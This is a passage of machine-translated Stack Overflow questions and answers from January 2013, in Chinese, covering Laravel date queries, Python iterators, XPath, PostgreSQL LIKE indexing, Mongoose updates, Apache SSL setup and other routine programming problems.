具体来说，`test_semismooth.py`是在`~/otherlab/other/sim`（当前目录是`~/otherlab/other`）。

为什么快速修复不使用路径？有没有办法来解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T22:50:01.983

我不确定如何使用路径，但更改`errorformat`以了解脚本的工作目录可以解决问题。具体来说，

1.  在进入脚本目录`Entering directory '$dir'`之前打印。`cd`
2.  添加`%DEntering directory '%f'`到我的`errorformat`定义中`.vimrc`。

# laravel - Laravel/Eloquent 和比较日期

> ID：14346431
> 
> 赞同：12
> 
> 时间：2013-01-15T20:36:34.177
> 
> 标签：laravel, eloquent

我想返回我的数据库表中一天或更早的所有行。我正在使用 Laravel 4。这是我尝试过的：

```
$date = date('Y-m-d H:i:s');
return MainContact::where(DATEDIFF('timestamp', $date), '<=', 1)->get(); 
```

这行不通。我阅读了文档，您似乎无法传递 Laravel MySQL 函数。 `timestamp`是一个日期时间字段。如何在 Laravel 4 中比较这些日期？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-15T22:27:39.880

user1977808 给你的答案不好，因为 MySQL 不能在时间戳列上使用索引，因为它必须为每一行计算 DATE_SUB 函数的输出。避免这样的查询，他们每次都必须处理整个表！

像这样的东西怎么样：

```
return MainContact::where('timestamp', '>=', time() - (24*60*60))->get(); 
```

我把它`>=`放在那里是因为你说“一天或更少”，所以他们必须有比昨天晚的时间戳。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2015-10-18T06:08:43.777

或者，

你可以使用与 Laravel 捆绑的[Carbon API 。](https://github.com/briannesbitt/Carbon)

```
ModelName::where( 'timestamp', '>=', Carbon::now() )->get(); 
```

参考： http: [//laravel.com/docs/5.1/eloquent-mutators](http://laravel.com/docs/5.1/eloquent-mutators)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T22:10:17.780

```
return MainContact::where('timestamp', '>=', time() - (24*60*60))->get(); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-03-13T11:44:30.433

您也可以使用`whereDate()`,`whereDay()`和. 在这种情况下，可以使用 Carbon 的简单日期函数：`whereMonth()``whereYear()``whereDate()`

`return MainContact::whereDate('dateField', '<', Carbon::now()->subDay())->get();`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-15T21:47:27.990

您还可以使用以下方法进行原始查询：

```
$results = DB::query( 'query' ); 
```

您只是不要将模型对象返回到结果变量中

# php - 计算表中的行，然后获取 id 并从另一个表中打印它们

> ID：14346443
> 
> 赞同：-1
> 
> 时间：2013-01-15T20:37:11.340
> 
> 标签：php, mysql, sql, codeigniter, codeigniter-2

我如何使用 Codeigniter 或 SQL 来计算它们具有相同值的行数（表：响应，行：task_id），然后使用 task_id 从包含信息的表中打印出结果（表：任务） .

我希望你明白。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:59:43.820

虽然我不是 100% 确定我理解您的问题，但如果您尝试获取响应表中的任务 ID 数并将其链接到任务表，您是否尝试过这样的操作：

```
select t.taskid, t.taskname, r.taskcount
from tasks t
join 
(
  select taskid, count(taskid) taskcount
  from responds
  group by taskid
) r 
  on t.taskid = r.taskid 
```

还有[SQL 小提琴](http://sqlfiddle.com/#!2/067c6/1)。

# css - 如何在其他 div 中拉伸 div

> ID：14346445
> 
> 赞同：0
> 
> 时间：2013-01-15T20:37:11.977
> 
> 标签：css, html

我希望我的 3 个子 div 垂直拉伸 100%，并且我希望它们水平相邻。所以如果我调整我的父 div 的大小，子 div 会相应地调整大小，但会始终保持水平相邻（每个将占用大约 33% 的宽度）

所以这里是CSS：

```
.appcontent {
    position: absolute;
    left: 80px;
    right: 50px;
    top: 30px;
    max-width: 1050px;
    min-height: 400px;
    border: 2px solid black;
}

.box {
    display: inline-block;
    height: 98%;
    padding: 10px;
    border: 2px solid black; 
} 
```

和 HTML：

```
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>jQuery demo</title>
  <script src="jquery.js"></script>
  <script src="index.js"></script>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="appcontent">
    <div class="box">
        <h3>App 1</h3>
    </div>
    <div class="box">
        <h3>App 2</h3>
    </div>
    <div class="box">
        <h3>App 3</h3>
    </div>
  </div>

</body>
</html> 
```

以防万一我也把它放在这里[http://jsfiddle.net/naWsh/](http://jsfiddle.net/naWsh/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:42:00.500

我之前用全面的解释[流体设计回答了这个问题](https://stackoverflow.com/questions/14168051/mobile-webpage-layout-carousel-like/14308790#14308790)

只是代替 400% 使它成为 100% 和它的孩子 33%

# python - 为什么我的返回列表的类不会迭代？

> ID：14346447
> 
> 赞同：1
> 
> 时间：2013-01-15T20:37:19.120
> 
> 标签：python, class, python-2.7, iterator

这是我的代码，我用它打开一个 excel 表，然后将每一行作为字符串列表返回（其中每个单元格都是一个字符串）。该类返回一个列表，该列表填充的列表与文件中的行数一样多。所以 50 行将返回 50 个列表。

```
from xlrd import open_workbook

class ExcelReadLines(object):

    def __init__(self,path_to_file):
        '''Accepts the Excel File'''
        self.path_to_file = path_to_file
        self.__work__()

    def __work__(self):
        self.full_file_as_read_lines = []
        self.book = open_workbook(self.path_to_file)
        self.sheet = self.book.sheet_by_index(0)

        for row_index in range(self.sheet.nrows):
            single_read_lines = []
            for col_index in range(self.sheet.ncols):
                cell_value_as_string = str(self.sheet.cell(row_index,col_index).value)
                cell_value_stripped = cell_value_as_string.strip('u')
                single_read_lines.append(cell_value_stripped)
            self.full_file_as_read_lines.append(single_read_lines)

        return self.full_file_as_read_lines 
```

但是当我运行时：

```
for x in ExcelReader('excel_sheet'): print x 
```

我收到错误消息：

```
class is not iterable 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-15T20:39:00.070

为了使一个类可迭代，它需要有一个`__iter__`方法。

考虑：

```
class Foo(object):
    def __init__(self,lst):
        self.lst = lst
    def __iter__(self):
        return iter(self.lst) 
```

例子：

```
>>> class Foo(object):
...     def __init__(self,lst):
...         self.lst = lst
...     def __iter__(self):
...         return iter(self.lst)
... 
>>> Foo([1,2,3])
<__main__.Foo object at 0xe9890>
>>> for x in Foo([1,2,3]): print x
... 
1
2
3 
```

* * *

您的示例似乎作为生成器会更好一些-我真的不明白这里对类的需求是什么：

```
def excel_reader(path_to_file):
    book = open_workbook(path_to_file)
    sheet = book.sheet_by_index(0)

    for row_index in range(sheet.nrows):
        single_read_lines = []
        for col_index in range(sheet.ncols):
            cell_value_as_string = str(self.sheet.cell(row_index,col_index).value)
            cell_value_stripped = cell_value_as_string.strip('u')
            single_read_lines.append(cell_value_stripped)
        yield single_read_lines 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T20:40:23.217

您应该研究实现 Python 的[特殊迭代器方法](http://docs.python.org/2/reference/datamodel.html#emulating-container-types)。

另外，请注意，您不应命名方法`__work__`，因为它使用魔术方法语法，但实际上并不是真正的魔术方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T20:40:41.047

你在这里有几个问题。

1.  您的代码不返回任何内容。您调用`__work__`但不返回值。

2.  即使这样做了，那也无济于事，因为从返回的东西`__init__`不会使对象成为那个东西。

3.  无论如何，您都不希望您的对象*成为*列表，您只想对其进行迭代。

有关如何在 Python 中编写迭代器的简单示例，请参阅[此问题。](https://stackoverflow.com/questions/19151/build-a-basic-python-iterator)

此外，您不应像`__work__`在代码中那样使用双下划线三明治名称。按照惯例，这种名称是为 Python 内部使用而保留的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T20:55:20.003

除非我弄错了，否则你真正想要的是

```
def first_sheet(fname):
    wb = xlrd.open_workbook(fname)
    ws = wb.sheet_by_index(0)
    for i in xrange(ws.nrows):
        yield ws.row_values(i) # maybe strip 'u''s - but that looks a bit sus... (probably something to do with your `str`)

list_of_rows = list(first_sheet('somefile.xls')) 
```

然后使用`zip`if 需要进行任何换位...

# xpath - 如何为动态层次结构下的节点编写 XPATH

> ID：14346451
> 
> 赞同：0
> 
> 时间：2013-01-15T20:37:32.507
> 
> 标签：xpath

我有一个很大的 XML。该 XML 的片段如下所示：

```
<div class="x-column-inner" id="ext-gen422" style="width: 850px;">
 <div id="ext-comp-1206" style="width: 14px;" class=" x-column">
  <div tabindex="-1" class="x-form-item  x-hide-label" id="ext-gen434">
   <label class="x-form-item-label" style="width:100px;" for="ext-comp-1180" id="ext-gen435"></label>
  <div style="padding-left:105px" id="x-form-el-ext-comp-1180" class="x-form-element">
   <div class="x-form-check-wrap" id="ext-gen436" style="width: 14px; height: 28px;">
    <input type="checkbox" name="ext-comp-1180" id="ext-comp-1180" autocomplete="off" class=" x-form-checkbox x-form-field">
     <label class="x-form-cb-label" for="ext-comp-1180" id="ext-gen437">&nbsp;</label>
    </div></div>  <div class="x-form-clear-left">
    </div>
   </div>
  </div>
 <div id="ext-comp-1207" style="width: 150px;" class=" x-column">
  <label id="ext-comp-1203" style="width: 140px;">Add to Watchlist</label>
</div>
<div id="ext-comp-1208" style="width: 107px;" class=" x-column"> 
```

我需要根据具有文本“添加到监视列表”的标签节点找到复选框类型的“输入”节点。

由于“输入”和“标签”节点位于不同的层次结构中， // 语法似乎不起作用：

```
//div[label[contains(text(),'Add to Watchlist')]] 
```

只会给子标签的父div。我试图从这个片段的最顶层节点开始

```
$x("//div[@class='x-column-inner' and //label[contains(text(),'Add to Watchlist')]]") 
```

但这给出了 6 个可能的匹配项。

注意：不能使用@id 属性，因为这是动态分配给节点的，所以下次页面加载时@id 会有所不同。我不想使用 position() 谓词，因为这会使 XPATH 静态，并且 xpath 可能会随着位置的任何变化而中断。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:59:26.470

您可以尝试这样的事情，但它看起来非常贪婪......基本上它所做的是在`input`标签的每个轴中搜索以查看是否有关联的`label`标签。因此，对于每一个`input`，它都会在其祖先、后代和兄弟姐妹中搜索。当然有一些更聪明的解决方案。

```
//input[@type = 'checkbox' and (@id = ancestor::label/@for or @id = descendant::label/@for or @id = following::label/@for or @id = preceding::label/@for)] 
```

但是，您的代码段并不有趣，不会`input`匹配任何标签，请考虑提供更好的代码段。它将提高答案的准确性。

**编辑**：这是添加“添加到监视列表”约束的（未经测试的）方法。

```
//input[@type = 'checkbox' and (@id = ancestor::label[. = 'Add to Watchlist']/@for or @id = descendant::label[. = 'Add to Watchlist']/@for or @id = following::label[. = 'Add to Watchlist']/@for or @id = preceding::label[. = 'Add to Watchlist']/@for)] 
```

但是再一次，这些 xpath 请求非常贪婪，并且不能保证您匹配`input`与 a 关联的每个元素`label`，例如以下`input`代码段中将不匹配：

```
<div>
  <div>
    <label for="id">Add to Watchlist</label>
  </div>
  <div>
    <input type="checkbox" id="id" />
  </div>
<div> 
```

在一个 xpath 请求中可能有更有效的解决方案，但您应该考虑执行多个请求。
例如，一个请求查找具有文本“添加到监视列表”`for`的元素的每个属性值，`label`然后执行另一个请求以查找关联的`input`元素。我还应该尝试将您的请求限制在基础`form`元素的范围内。如果我有时间，也许我会提出更好的要求进行编辑。

**编辑 2** 这是一个有效且更智能的请求

```
//form//input[@type = 'checkbox' and @id = ancestor::form[1]//label[. = 'Add to Watchlist']/@for] 
```

你可以面对这个片段

```
<html>
  <form>
    <label for="bar">Add to Watchlist</label>
    <div>
      <div>
        <label for="id">Add to Watchlist</label>
      </div>
      <div>
        <input type="checkbox" id="id" />
        <input type="checkbox" id="foo" />
        <input type="checkbox" id="bar" />
        <input type="checkbox" />
        <input type="checkbox" id="" />
      </div>
    </div>
  </form>
  <label for="foo">Add to Watchlist</label>
</html> 
```

胸围最重要的是您了解它是如何工作的以及为什么它更好。请花点时间考虑一下。

# python - sql 像备用

> ID：14346454
> 
> 赞同：1
> 
> 时间：2013-01-15T20:37:44.877
> 
> 标签：python, sql, postgresql, indexing, sql-like

是否有任何其他解决方案可供使用而不是 Like 以匹配开头？

这是我要匹配的查询以使用like开头。

```
explain analyze select * from completedcalls where call_id like 'GWYA4NvSLzoIcvA7RAtmn_a9IelwOQeH@209.44.103.3%';
                                                    QUERY PLAN                                                    
------------------------------------------------------------------------------------------------------------------
 Seq Scan on completedcalls  (cost=0.00..52659.96 rows=112 width=228) (actual time=1.541..249.857 rows=2 loops=1)
   Filter: ((call_id)::text ~~ 'GWYA4NvSLzoIcvA7RAtmn_a9IelwOQeH@209.44.103.3%'::text)
 Total runtime: 249.893 ms
(3 rows) 
```

这是非常广泛的，因为它进行序列扫描而不是索引扫描。由于喜欢它的性质，它不能在提供的列上使用索引。列的索引很简单：

```
"i_call_id" btree (call_id) 
```

是否有任何特殊类别的索引可以帮助提高速度，或者在不使用类似的情况下实现相同的任何其他方式？

使用的表脚本是：

```
 Table "public.completedcalls"
    Column     |           Type           |  Modifiers   
---------------+--------------------------+--------------
 call_id       | character varying(128)   | 
 sip_code      | integer                  | 
 duration      | integer                  | 
 setup_time    | timestamp with time zone | not null
 authname      | character varying(30)    | 
 src_sig_ip    | character varying(20)    | 
 dst_sig_ip    | character varying(20)    | 
 cld           | character varying(22)    | 
 cli           | character varying(22)    | 
Indexes:
    "i_call_id" btree (call_id)
    "i_dst_sig_ip" btree (dst_sig_ip) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:48:53.183

[文档](http://www.postgresql.org/docs/9.2/static/indexes-opclass.html)中描述了这种`LIKE`索引使用（或缺少）的情况：

简而言之，您应该将索引创建为

```
create index i_call_id on completedcalls(call_id varchar_pattern_ops); 
```

但是请阅读上面链接的页面以了解警告。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T20:42:23.877

[`LIKE`](http://www.postgresql.org/docs/current/static/indexes-types.html)假设没有前导通配符，[语句仍然可以与 b-tree 索引一起使用：](http://www.postgresql.org/docs/current/static/indexes-types.html)

> 优化器还可以对涉及模式匹配运算符的查询使用 B-tree 索引，`LIKE`如果模式是常量并且锚定到字符串的开头 - 例如，`col LIKE 'foo%'`或`col ~ '^foo'`，但不是`col LIKE '%bar'`。

如果您的索引没有被使用，那么它的原因不是`LIKE`这里显示的用法......

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T20:42:14.877

虽然我不确定它是否有助于提高性能，但您是否考虑过使用正则表达式？您可以使用插入符号`^`返回位于字符串开头的记录。

也许是这样的：

```
select * 
from completedcalls 
where call_id ~ '^GWYA4NvSLzoIcvA7RAtmn_a9IelwOQeH@209.44.103.3'; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T20:42:21.690

`LIKE`能够在带有尾随的条件上使用索引`%`。

优化器可能认为完全扫描比索引扫描更好，因为后者需要对其他列和记录可见性范围进行额外的表查找。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-15T20:42:51.360

从外观上看，您可能应该将该 call_id 列拆分为每个组件的单独列。例如，您可以为示例中的 ID 和 IP 地址添加带有索引的附加列，创建这些索引，然后在这些索引上进行选择。

# matlab - 同一轴上的两个高斯分布图

> ID：14346456
> 
> 赞同：-1
> 
> 时间：2013-01-15T20:37:54.903
> 
> 标签：matlab, plot, gaussian

我试图在同一轴上绘制两个均值为零的高斯分布，一个方差为 1，另一个方差为 2。这是我的代码。

```
X= 0 + 1.*randn(2,500);
plot(X(1,:),X(2,:),'x');
hold on
%plot(m(1),m(2),'r*')
Y= 0 + 2.*randn(2,500);
plot(Y(1,:),Y(2,:),'gx') 
```

请检查一下我是否正确地完成了它。我也想让它们在二维图中并叠加。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T15:59:14.707

您正在绘制随机生成的数据（具有正态分布）。如果这就是你想要的，是的，它工作正常。

如果要绘制变量的密度函数，可以通过以下方式进行：

```
mu = 0;
sigma1 = 1;
sigma2=2;
x = -4*sigma2:1e-3:4*sigma2; 
y1 = pdf('normal', x, mu, sigma1);
y2 = pdf('normal', x, mu, sigma2);
plot(x, y1)
hold on 
plot(x, y2, 'r')
legend('mu=0, sigma=1', 'mu=0, sigma=2')
title('Density functions') 
```

![密度函数图](../Images/9bef0fda3fd7eda5ca30f955b1102f18.png)

# maven - Maven 和 LifecycleExecutionException

> ID：14346459
> 
> 赞同：0
> 
> 时间：2013-01-15T20:38:00.117
> 
> 标签：maven

我想用 Maven 对以下 3 个项目进行建模：

*   父项目`A`
*   2个模块`B`和`C`
*   `B`->`C`和`C`->`B`

我测试了 3 件事：

1.  创建依赖项`B`并`C`在`A`
2.  `B`在`C`和`C`中创建依赖关系`B`
3.  同上 2 并添加来自依赖项的内部项目的排除和来自依赖项的`B`内部`B`项目的排除。`C``C``C``B`

都给我`LifecycleExecutionException`。

那么有没有办法对此进行建模？

我希望唯一的方法是不要合并`B`到`C`一个独特的项目中......

# google-app-engine - 如何增加 GAE 数据存储索引配额？

> ID：14346460
> 
> 赞同：2
> 
> 时间：2013-01-15T20:37:59.960
> 
> 标签：google-app-engine, google-cloud-datastore

我快到了 200 的限制。我以为曾经有一个表格可以请求增加超过 200 的配额，但现在看起来那个链接已经消失了。我所看到的只是此页面上的通用功能请求链接： [https ://developers.google.com/appengine/docs/quotas#Datastore](https://developers.google.com/appengine/docs/quotas#Datastore)

# javascript - 如何根据相同的单选按钮值进行不同的计算？

> ID：14346461
> 
> 赞同：0
> 
> 时间：2013-01-15T20:38:00.973
> 
> 标签：javascript

我是新手。我根据这篇文章制作了一个代码： [SUM radio button values and checkboxes values in one calculation - javascript and html](https://stackoverflow.com/questions/14190960/sum-radio-button-values-and-checkboxes-values-in-one-calculation-javascript-an)

我制作了两组单选按钮，其值为 1-5（第一组）和 100-500（第二组）。我需要每个组中选定按钮的值来用它们进行不同的计算并显示结果。

在这里，我将第一组的值乘以 2 并添加第二组的值。现在我想显示另一个计算的结果。例如：

```
var sum=parseInt(val1-3) + parseInt(val2*4) 
```

如何在单独的“单元格”中同时显示两个结果。

```
<form name="form1" id="form1" runat="server">
<legend>Header 1</legend>
<p><input id="rdo_1" type="radio" value="1" name="price" onClick="DisplayPrice(this.value);"><label for="radio1">Radio 1</label></p>
<p><input id="rdo_2" type="radio" value="2" name="price" onClick="DisplayPrice(this.value);"><label for="radio2">Radio 2</label></p>
<p><input id="rdo_3" type="radio" value="3" name="price" onClick="DisplayPrice(this.value);"><label for="radio3">Radio 3</label></p>
<p><input id="rdo_4" type="radio" value="4" name="price" onClick="DisplayPrice(this.value);"><label for="radio4">Radio 4</label></p>
<p><input id="rdo_5" type="radio" value="5" name="price" onClick="DisplayPrice(this.value);"><label for="radio5">Radio 5</label></p>
</form>                    

<hr>

<form name="form2" id="form2" runat="server">
<legend>Header 2</legend>
<p><input id="rdo_1" type="radio" value="100" name="price2" onClick="DisplayPrice(this.value);"><label for="rad1">Radio 1</label></p>
<p><input id="rdo_2" type="radio" value="200" name="price2" onClick="DisplayPrice(this.value);"><label for="rad2">Radio 2</label></p>
<p><input id="rdo_3" type="radio" value="300" name="price2" onClick="DisplayPrice(this.value);"><label for="rad3">Radio 3</label></p>
<p><input id="rdo_4" type="radio" value="400" name="price2" onClick="DisplayPrice(this.value);"><label for="rad4">Radio 4</label></p>
<p><input id="rdo_5" type="radio" value="500" name="price2" onClick="DisplayPrice(this.value);"><label for="rad5">Radio 5</label></p>
</form>                             

<p><label for="valueTotal">Value$:</label>
<input type="text" name="valueTotal" id="valueTotal" value="" size="2"readonly="readonly">    </p>

<script type="text/javascript">
function DisplayPrice(price)
{
    var val1 = 0;
    for( i = 0; i < document.form1.price.length; i++ )
    {
        if( document.form1.price[i].checked == true )
        {
            val1 = document.form1.price[i].value;
        }
    }

    var val2 = 0;
    for( i = 0; i < document.form2.price2.length; i++ )
    {
        if( document.form2.price2[i].checked == true )
        {
            val2 = document.form2.price2[i].value;
        }
    }

    var sum=parseInt(val1*2) + parseInt(val2);
    document.getElementById('valueTotal').value=sum;
}
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T17:59:50.733

只需为您的结果定义不同的输入字段。

```
<p>
  <label for="valueTotal1">Value1$:</label>
  <input type="text" name="valueTotal1" id="valueTotal1"
  value="" size="2" readonly="readonly" />
</p>
<p>
  <label for="valueTotal2">Value2$:</label>
  <input type="text" name="valueTotal2" id="valueTotal2"
  value="" size="2" readonly="readonly" />
</p>
<p>
  <label for="valueTotal3">Value3$:</label>
  <input type="text" name="valueTotal3" id="valueTotal3"
  value="" size="2" readonly="readonly" />
</p> 
```

```
function DisplayPrice() {
  for (i = 0; i < document.form1.price.length; i++) {
    if (document.form1.price[i].checked == true) {
      val1 = document.form1.price[i].value;
    }
  }
  for (i = 0; i < document.form2.price2.length; i++) {
    if (document.form2.price2[i].checked == true) {
      val2 = document.form2.price2[i].value;
    }
  }

  if (val1 != null && val2 != null) {
    document.getElementById('valueTotal1').value = parseInt(val1) * 2 + parseInt(val2);
    document.getElementById('valueTotal2').value = parseInt(val1) * 3 + parseInt(val2);
    document.getElementById('valueTotal3').value = parseInt(val1) * 4 + parseInt(val2);
  }
} 
```

如果你被允许使用 jQuery，你可以简单化这个函数：

```
function DisplayPrice() {
  var val1 = $('input[name=price]:radio:checked').val();
  var val2 = $('input[name=price2]:radio:checked').val();

  if(val1 != null && val2 != null) {
    $('#valueTotal1').val(parseInt(val1) * 2 + parseInt(val2));
    $('#valueTotal2').val(parseInt(val1) * 3 + parseInt(val2));
    $('#valueTotal3').val(parseInt(val1) * 4 + parseInt(val2));
  }
} 
```

我创建了两个小提琴：[使用 jQuery](http://jsfiddle.net/7BVT8/ "用 jQuery")和[没有](http://jsfiddle.net/FbewD/ "没有 jQuery")

请注意另一件事：不要写`parseInt(val1-3)`. 在将字符串转换为整数之前，您不能减去 3。

**编辑**
如果您想拥有默认值，您可以在搜索选中的单选按钮之前将它们写入变量。如果未找到选中的按钮，则默认值将保持不变。另一种解决方案是检查变量是否仍然为空，并在搜索选中的按钮后用默认值填充它。

```
function DisplayPrice() {
  //Default values - solution I
  var val1 = 1;
  var val2 = 1;

  val1 = $('input[name=price]:radio:checked').val();
  val2 = $('input[name=price2]:radio:checked').val();

  //Default values - solution II
  if(val1 == null) {
    val1 = 1;
  }
  if(val2 == null) {
    val2 = 1;
  }

  if(val1 != null && val2 != null) {
    $('#valueTotal1').val(parseInt(val1) * 2 + parseInt(val2));
    $('#valueTotal2').val(parseInt(val1) * 3 + parseInt(val2));
    $('#valueTotal3').val(parseInt(val1) * 4 + parseInt(val2));
  }
} 
```

# asp.net - 您可以设置文本框以记住以前使用 ASP.NET 4.0 的条目吗？

> ID：14346465
> 
> 赞同：0
> 
> 时间：2013-01-15T20:38:14.093
> 
> 标签：asp.net, textbox

网站从 .NET 1.1 升级到 .NET 4.0，客户抱怨文本框的自动完成功能不再起作用。这可以以某种方式设置吗？站点范围内还是每个控件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T18:10:36.907

问题是表单标签上的 HTML 属性 autocomplete="off"。

# javascript - 在查找中更新文档

> ID：14346468
> 
> 赞同：1
> 
> 时间：2013-01-15T20:38:33.080
> 
> 标签：javascript, node.js, mongoose

我在使用 Mongoose 从查找中更新文档时遇到问题。只有当我尝试用一​​个对象（例如 doc = req.body）覆盖文档时，才会出现问题。但是，我可以直接将原始文档的属性设置为特定的字符串（例如 doc.name = 'jasonborne';）。

我已经验证 res.body 是一个对象，所以我不明白为什么我不能这样设置它。

```
Client.findById(req.params.client_id, function (err, client) {

    if (err)
        return next(new restify.InternalError(err));

    // client.name = 'jason borne';

            client = req.body;

    client.save(function(err) {

        if (err)
            return next(new restify.InternalError(err));

        res.send(client);

    });

}); 
```

尝试将文档设置为对象时，我收到错误消息：

TypeError: Object # has no method 'save'

我知道我可以使用简单的 Client.update(...) 命令进行更新，但是这种方法不允许我的模式中间件或验证运行（在[Mongoose 文档](http://mongoosejs.com/docs/api.html)中注明）。

有什么想法吗？我是 Node 和 Mongoose 的新手。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T21:19:02.443

您现在得到的症状是由于您正在替换 mogoose 模型对象（使用 save、find 等方法），由从您的身体解析的一个简单 json 对象（缺少`save`.

尝试进行更新而不是查找/保存。

```
 Client.update({_id: req.params.client_id}, {$set : req.body}, function(err) {...}); 
```

或者尝试将您`req.body`的对象合并到`client`对象中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T21:26:34.207

您需要使用类似下划线的[`extend`](http://documentcloud.github.com/underscore/#extend)方法将 的属性复制`req.body`到对象中，而不是像现在`client`一样重新指向`client`。`req.body`

```
var _ = require('underscore');
Client.findById(req.params.client_id, function (err, client) {

    if (err)
        return next(new restify.InternalError(err));

    _.extend(client, req.body);
    client.save(function(err) {
        if (err)
            return next(new restify.InternalError(err));
        res.send(client);
    });
}); 
```

# apache - 无法安装自签名 SSL 证书。阿帕奇错误

> ID：14346473
> 
> 赞同：1
> 
> 时间：2013-01-15T20:39:01.490
> 
> 标签：apache, ubuntu, ssl, openssl, ssl-certificate

我正在尝试安装我在此处使用这些说明生成的自签名证书：

[http://www.akadia.com/services/ssh_test_certificate.html](http://www.akadia.com/services/ssh_test_certificate.html)

我已准备好证书，并已多次重读说明。但是，一个区别是我将我的放在 /etc/apache2/conf.d/security/

我从 apache 收到以下错误。

```
Syntax error on line 1 of /etc/apache2/conf.d/security/server.crt:
Invalid command '-----BEGIN', perhaps misspelled or defined by a module not included in the server configuration
Action 'configtest' failed.
The Apache error log may have more information.
   ...fail! 
```

有什么线索吗？我在 Ubuntu 11.04 中运行来自 tasksel 的最新灯安装。（可用站点中的虚拟主机等）。我还确保使用 a2enmod ssl 启用了 ssl。它说它已经启用。

------------VHOST---------------

```
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        ServerName www.cmp.me

        SSLEngine on
        SSLCertificateFile /etc/apache2/conf.d/security/server.crt
        SSLCertificateKeyFile /etc/apach2/conf.d/security/server.key

        DocumentRoot /var/www/sites/www.cmp.me
        <Directory />
                Options FollowSymLinks
                AllowOverride None
        </Directory>
        <Directory /var/www/sites/www.cmp.me>
                Options Indexes FollowSymLinks MultiViews
                AllowOverride None
                Order allow,deny
                allow from all
        </Directory>

        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride None
                Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>

        ErrorLog /var/www/errors/cmp-error.log

        # Possible values include: debug, info, notice, warn, error, crit,
        # alert, emerg.
        LogLevel debug

    Alias /doc/ "/usr/share/doc/"
    <Directory "/usr/share/doc/">
        Options Indexes MultiViews FollowSymLinks
        AllowOverride None
        Order deny,allow
        Deny from all
        Allow from 127.0.0.0/255.0.0.0 ::1/128
    </Directory>

</VirtualHost> 
```

# r - 带有 ggplot 的 RA 简单单变量图

> ID：14346481
> 
> 赞同：2
> 
> 时间：2013-01-15T20:39:26.823
> 
> 标签：r, ggplot2

我想做一个像这样的简单图表：

```
ff<-data.frame(Freq=c(rep(10000,10),rep(100,15),rep(10,50),rep(1,100)))
plot(log(ff$Freq),type="l") 
```

是添加 ax 变量的唯一选择吗？

```
require(ggplot2)
ff$Ord <- 1:nrow(ff)
ggplot(data=ff,aes(x=Ord,y=log(Freq))) + geom_line() 
```

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T05:32:25.800

这是 geom_step() 的一种方法：

```
library(ggplot2)
library(scales)
ggplot(ff, aes(x = seq_along(Freq), y = log10(Freq))) + geom_step(size = 1) +
   labs(x = "Index", y = "Freq") +
   scale_y_continuous(labels = math_format(10^.x)) 
```

# android - 从 MatOfKeyPoint 到 MatOfPoint2f 的 OpenCV4Android 转换

> ID：14346482
> 
> 赞同：1
> 
> 时间：2013-01-15T20:39:27.530
> 
> 标签：android, opencv, tracking, opticalflow

我正在尝试使用 OpenCV for Android (OpenCV 2.4.3) 我正在编写一个程序来跟踪关键点。我正在尝试使用 FeatureDetector 来检测关键点，然后使用 Video.calcOpticalFlowPyrLK 来跟踪它们。让我难过的问题是 FeatureDetector 函数返回一个 MatOfKeyPoint 而 calcOpticalFlowPyrLK 采用一个 MatOfPoint2f。

请注意，MatOfKeyPoint 与 MatOfPoint 不同（从 MatOfPoint 到 MatOfPont2f 的转换很简单）。

到目前为止，这是我的代码：

```
//Feature detector for LKT flow estimation
FeatureDetector cvFeatureDetector;
//Vector of keypoints
MatOfKeyPoint keypoints;

...
...

//intitialize detector
cvFeatureDetector = FeatureDetector.create(FeatureDetector.GFTT);

keypoints = new MatOfKeyPoint();

...
...

//mPrevImgMat is a grayscale image - previous frame
//mCurrentImgMat is a grayscale image - current frame

//Run feature detector in previous image
cvFeatureDetector.detect(mPrevImgMat, keypoints);

MatOfPoint2f keypointsFound = new MatOfPoint2f();
MatOfByte keypointsStatus = new MatOfByte();
MatOfFloat err = new MatOfFloat();
Size winSize = new Size(25,25);
int maxLevel = 3;

//Optical flow to find keypoints in current image
Video.calcOpticalFlowPyrLK(mPrevImgMat, mCurrentImgMat, keypoints,
            keypointsFound, keypointsStatus, err, winSize, maxLevel);

//Obviously "keypoints" in the line above does not work. How does one covert
//keypoints to MatOfPoint2f? 
```

到目前为止我尝试过的事情没有成功：（1）keypoints.convertTo（）（2）从关键点创建一个向量，然后尝试填充一个点向量点列表的向量。然后在调用流函数 (MatOfPoint2f) pointList (3) 尝试从头开始填充 MatOfPoint2f 时将类型转换为 MatOfPoint2f。无法弄清楚如何执行此操作 (4) 在 MatOfPoint2f 中使用 fromArray 方法 - 不确定此方法的作用。此方法的文档为空白。我错过了一些明显的东西吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T15:39:52.250

